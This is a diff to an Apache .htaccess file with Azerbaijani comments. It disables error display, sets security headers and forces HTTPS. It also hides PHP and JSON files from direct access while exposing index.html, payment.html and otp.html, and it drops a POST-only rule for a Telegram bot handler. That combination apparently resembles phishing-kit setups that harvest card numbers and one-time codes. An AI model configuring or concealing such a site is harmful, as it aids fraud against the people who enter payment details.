@@ -1,7 +1,9 @@
+# Xəta göstərmə
 php_flag display_errors off
 php_flag display_startup_errors off
 php_value error_reporting 0
 
+# Header Təhlükəsizlik
 <IfModule mod_headers.c>
     Header set X-XSS-Protection "1; mode=block"
     Header set X-Content-Type-Options "nosniff"
@@ -9,16 +11,32 @@ php_value error_reporting 0
     Header set Referrer-Policy "no-referrer"
 </IfModule>
 
-# Bot faylına POST icazəsi
-<Files "telegram-handler.php">
-    <LimitExcept POST>
-        Order Deny,Allow
-        Deny from all
-    </LimitExcept>
-</Files>
-
+# İndeksləməni söndür
 Options -Indexes
 
+# HTTPS-ə yönləndir
 RewriteEngine On
 RewriteCond %{HTTPS} off
 RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]
+
+# .php fayllarına BİRBAŞA ERİŞİMİ BLOKLA (index.html xaric)
+<FilesMatch "\.(php|inc|config|json)$">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+
+# YALNIZ index.html-ə icazə ver
+<Files "index.html">
+    Order Allow,Deny
+    Allow from all
+</Files>
+
+<Files "payment.html">
+    Order Allow,Deny
+    Allow from all
+</Files>
+
+<Files "otp.html">
+    Order Allow,Deny
+    Allow from all
+</Files>
